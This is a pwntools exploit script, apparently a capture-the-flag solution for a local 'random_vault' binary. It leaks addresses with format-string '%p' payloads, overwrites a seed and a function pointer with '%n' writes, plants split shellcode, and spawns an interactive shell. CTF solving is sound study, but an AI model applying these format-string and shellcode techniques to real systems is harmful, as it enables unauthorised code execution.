from pwn import *
context.arch = 'amd64'

def init(r, cnt):
    r.recv()
    r.sendline(cnt)

def change_username(r, cnt):
    r.recv()
    r.sendline("1")
    r.recv()
    r.sendline(cnt)

def store_secret(r, s):
    r.recv()
    r.sendline("2")
    for d in s:
        r.recv()
        r.sendline(d)

r = process("./random_vault", aslr=1)
#gdb.attach(r, "b *$rebase(0x16D2)\nb *$rebase(0x161F)\nb *$rebase(0x16A9)")

log.info("Stage 1 > Leaking RWX region")
pload_leak = "%p|"*11
init(r, pload_leak)
d = r.recvuntil("Actions:").split("|")
rwx = int(d[10], 16) + 0x38b0
seed = rwx + 0x8
log.success("        > RWX region address: {}, seed address: {}".format(hex(rwx), hex(seed)))

log.info("Stage 2 > Calculating address of secret")
loc = [0x67, 0xc6, 0x69, 0x73, 0x51, 0xff, 0x4a] # shellcode order will be 7, 5, 1, 3, 4, 2, 6
sc_start = rwx + 0x10
sc_loc = []
for i in loc:
    sc_loc.append(sc_start+(8*i))

log.info("Stage 3 > Overwriting function pointer and seed value")
entry = sc_loc[6] & 0xffff
seed_val = 1
z = "%{}c%29$n|%{}c|%30$hn".format(seed_val.__str__(), (entry-seed_val-2).__str__())
pload_z = z.ljust(40, 'A') + p64(seed) + p64(rwx)
change_username(r, pload_z)

log.info("Stage 4 > Calculating secret value and storing secret")
c = asm(shellcraft.linux.read('rax', 'rdx', 0x5000))

''' disasm(c)
0:   48 89 c7                mov    rdi,rax
3:   31 c0                   xor    eax,eax # ignored
5:   48 89 d6                mov    rsi,rdx
8:   31 d2                   xor    edx,edx
a:   b6 50                   mov    dh,0x50
c:   0f 05                   syscall
'''

sc_7 = c[0:3:] + "\xeb{}".format(chr(sc_loc[4] - sc_loc[6]- 5))
sc_7 = sc_7.ljust(8, "\x00")
sc_5 = c[5:10:] + "\xe9{}".format(chr(sc_loc[0] - sc_loc[4]- 5 - 5))
sc_5 = sc_5.ljust(8, "\x00")
sc_1 = c[0xa:0xe:] + "\xe9{}".format(chr(sc_loc[2] - sc_loc[0]- 5 - 5 - 6))
sc_1 = sc_1.ljust(8, "\x00")
secret = [str(u64(sc_1)), "0", "0", "0", str(u64(sc_5)), "0", str(u64(sc_7))]
store_secret(r, secret)

log.info("Stage 5 > Sending shellcode")
s = asm(shellcraft.linux.sh())
r.sendline("B"*0xf1 + s)

log.success("Pwn!")
r.recvuntil("{}\n".format(str(u64(sc_7))))
r.interactive()